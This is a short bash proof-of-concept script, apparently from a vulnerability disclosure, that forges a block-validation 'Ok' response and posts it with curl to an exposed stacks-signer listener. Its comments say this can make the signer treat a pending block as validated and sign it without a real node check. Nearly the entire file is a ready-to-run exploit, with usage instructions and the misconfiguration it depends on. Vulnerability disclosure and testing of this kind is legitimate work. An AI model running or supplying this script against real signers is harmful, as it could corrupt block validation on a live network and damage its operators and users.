#!/usr/bin/env bash
# PoC: forge stacks-node block validation events against an exposed stacks-signer listener.
#
# Prerequisites:
#   - stacks-signer running with reachable `endpoint` (misconfigured 0.0.0.0 is in sample mainnet conf)
#   - A block hash already tracked by that signer (from a real miner proposal)
#
# Usage:
#   ./scripts/poc-signer-event-injection.sh <signer_host:port> <signer_signature_hash_hex>
#
# Example:
#   ./scripts/poc-signer-event-injection.sh 192.168.1.50:30000 0xabc...

set -euo pipefail

TARGET="${1:?signer endpoint host:port required}"
HASH="${2:?signer_signature_hash hex required}"

BODY=$(cat <<EOF
{
  "result": "Ok",
  "signer_signature_hash": "${HASH}",
  "cost": {"runtime": 0, "read_count": 0, "write_count": 0, "read_length": 0, "write_length": 0},
  "size": 1,
  "validation_time_ms": 0,
  "replay_tx_hash": null,
  "replay_tx_exhausted": false
}
EOF
)

echo "[*] Sending forged BlockValidateResponse::Ok to http://${TARGET}/proposal_response"
curl -sS -X POST "http://${TARGET}/proposal_response" \
  -H 'Content-Type: application/json' \
  -d "${BODY}" \
  -w "\nHTTP %{http_code}\n"

echo "[*] If the signer had this block pending validation, it may mark valid=true and pre-commit/sign without a real node Ok."
